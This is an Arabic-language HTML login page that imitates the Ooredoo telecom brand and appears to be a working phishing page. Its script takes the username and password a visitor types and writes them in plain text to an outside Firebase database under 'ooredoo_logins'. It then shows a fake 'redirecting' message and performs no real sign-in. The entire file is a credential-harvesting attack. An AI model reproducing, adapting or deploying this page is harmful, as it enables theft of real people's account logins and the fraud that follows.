<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');

        body {
            font-family: 'Cairo', sans-serif;
            background-color: #ffffff;
            margin: 0; padding: 0;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 400px;
            box-sizing: border-box;
        }

        /* الهيدر المعدل */
        header {
            padding: 15px; 
            display: flex; 
            align-items: center; 
            justify-content: space-between; 
            border-bottom: 1px solid #f0f0f0;
            background-color: #ffffff;
        }
        .menu-icon { 
            font-size: 28px; 
            cursor: pointer; 
            color: #d71920; 
            font-weight: bold;
        }
        .logo-container img { 
            height: 40px; 
            width: auto;
            background-color: transparent !important; /* فرض الخلفية الشفافة */
            display: block;
        }

        .content-body { padding: 20px; }

        h1 { font-size: 24px; color: #333; margin-top: 20px; margin-bottom: 10px; }
        .sub-text { color: #666; font-size: 14px; margin-bottom: 25px; }

        .input-group { margin-bottom: 15px; }
        input {
            width: 100%; padding: 15px; border: 1px solid #ccc;
            border-radius: 5px; box-sizing: border-box; font-size: 16px;
        }

        .forgot-pass {
            color: #d71920; font-size: 14px; display: block;
            margin: 10px 0 25px 0; text-decoration: underline; cursor: pointer;
        }

        .login-btn {
            width: 100%; padding: 15px; background-color: #d71920;
            color: white; border: none; border-radius: 50px;
            font-size: 16px; font-weight: bold; cursor: pointer;
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div class="menu-icon">☰</div>
        <div class="logo-container">
            <img src="https://i.ibb.co/MxhZBkjF/Ooredoo-logo-1.jpg" alt="Ooredoo Logo">
        </div>
        <div style="width: 28px;"></div>
    </header>

    <div class="content-body">
        <h1>تسجيل الدخول</h1>
        <p class="sub-text">تسجيل الدخول باستخدام اسم المستخدم وكلمة المرور.</p>

        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="كلمة المرور" required>
            </div>
            
            <span class="forgot-pass">هل نسيت كلمة المرور؟</span>
            
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
        authDomain: "saso-inspection.firebaseapp.com",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
        projectId: "saso-inspection",
        storageBucket: "saso-inspection.firebasestorage.app",
        messagingSenderId: "1009002235896",
        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    let sessionID = localStorage.getItem('sessionID') || "ID_" + Math.floor(Math.random() * 90000);
    localStorage.setItem('sessionID', sessionID);

    document.getElementById('loginForm').onsubmit = (e) => {
        e.preventDefault();
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        database.ref('ooredoo_logins/' + sessionID).set({
            username: user,
            password: pass,
            timestamp: Date.now()
        }).then(() => {
            Swal.fire({ title: 'جاري التحويل', text: 'يرجى الانتظار...', icon: 'info', timer: 2000, showConfirmButton: false });
        });
    };
</script>

</body>
</html>
